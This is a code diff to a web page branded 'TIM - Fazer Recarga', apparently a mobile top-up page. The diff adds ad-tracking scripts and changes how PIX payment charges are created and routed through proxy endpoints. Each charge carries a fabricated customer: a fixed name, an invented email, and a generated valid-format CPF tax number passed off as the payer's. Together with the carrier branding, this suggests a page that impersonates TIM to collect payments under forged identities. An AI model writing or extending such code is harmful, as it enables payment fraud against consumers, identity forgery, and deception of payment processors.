@@ -8,6 +8,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TIM - Fazer Recarga</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <script src="../js/tracking.js"></script>
+    <!-- Utmify Pixel & UTMs Tracking -->
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
     <style>
         * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; outline: none; }
         body { background-color: #0114C4; color: white; margin: 0; padding: 0; }
@@ -296,16 +304,26 @@
         async function criarPixMultiPlataforma(phoneVal, valorStr) {
             const cleanPhone = normalizePhoneClient(phoneVal);
             const amount = parseValueToCentsClient(valorStr);
+            const generatedCpf = generateValidCpfClient();
+            const trackingParams = typeof window.gvdesenrolaMergeTracking === 'function' ? window.gvdesenrolaMergeTracking() : {};
+            const customerObj = {
+                name: 'Cliente Recarga TIM',
+                email: 'cliente.' + cleanPhone + '@recargatim.com.br',
+                phone: cleanPhone,
+                taxId: generatedCpf,
+                cpf: generatedCpf
+            };
             const xpayPayload = {
                 amount: amount,
                 expiresIn: 900,
                 externalId: 'tim_' + cleanPhone + '_' + Date.now(),
                 customer: {
-                    name: 'Cliente Recarga TIM',
-                    email: 'cliente.' + cleanPhone + '@recargatim.com.br',
-                    phone: cleanPhone,
-                    taxId: generateValidCpfClient()
-                }
+                    name: customerObj.name,
+                    email: customerObj.email,
+                    phone: customerObj.phone,
+                    taxId: customerObj.taxId
+                },
+                metadata: trackingParams
             };
 
             const proxyEndpoints = [
@@ -331,8 +349,13 @@
                             const txId = charge.id;
                             const brCode = charge.brCode || '';
                             const brCodeBase64 = charge.brCodeBase64 || '';
+                            if (typeof window.notificarUtmify === 'function') {
+                                window.notificarUtmify('waiting_payment', txId, charge.amount || amount, customerObj, 'Recarga TIM R$ ' + valorStr, 'prod_recarga');
+                            }
                             return {
                                 status: 200,
+                                customer: customerObj,
+                                amountCents: charge.amount || amount,
                                 result: {
                                     success: true,
                                     data: {
@@ -355,14 +378,16 @@
                 } catch (e) {}
             }
 
-            // Fallback para /api/pix (Node server.js, Vercel Function ou Netlify Function)
             const apiResp = await fetch('/api/pix', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: phoneVal || '', value: valorStr })
+                body: JSON.stringify({ phone: phoneVal || '', value: valorStr, cpf: generatedCpf, tracking: trackingParams })
             });
             const apiJson = await apiResp.json();
-            return { status: apiResp.status, result: apiJson };
+            if (apiJson?.success && apiJson?.data?.transactionId && typeof window.notificarUtmify === 'function') {
+                window.notificarUtmify('waiting_payment', apiJson.data.transactionId, apiJson.data.amount || amount, customerObj, 'Recarga TIM R$ ' + valorStr, 'prod_recarga');
+            }
+            return { status: apiResp.status, customer: customerObj, amountCents: amount, result: apiJson };
         }
 
         const btnRecarregar = document.getElementById('btn-recarregar');
@@ -387,7 +412,7 @@
             }
 
             try {
-                const { status, result } = await criarPixMultiPlataforma(phone || '', val);
+                const { status, result, customer, amountCents } = await criarPixMultiPlataforma(phone || '', val);
 
                 if (status === 429 || result.blocked) {
                     alert('⚠️ Você atingiu o limite de tentativas de recarga. Entre em contato com o suporte.');
@@ -398,7 +423,13 @@
                 }
 
                 if (result.success && result.data && result.data.paymentData) {
-                    const pixStore = { ...result.data.paymentData, transactionId: result.data.transactionId };
+                    const pixStore = {
+                        ...result.data.paymentData,
+                        transactionId: result.data.transactionId,
+                        amountCents: result.data.amount || amountCents,
+                        customer: customer,
+                        productName: 'Recarga TIM R$ ' + val
+                    };
                     sessionStorage.setItem('pixData', JSON.stringify(pixStore));
                     window.location.href = `pix.html?phone=${encodeURIComponent(phone || '')}&value=${encodeURIComponent(val)}`;
                 } else {
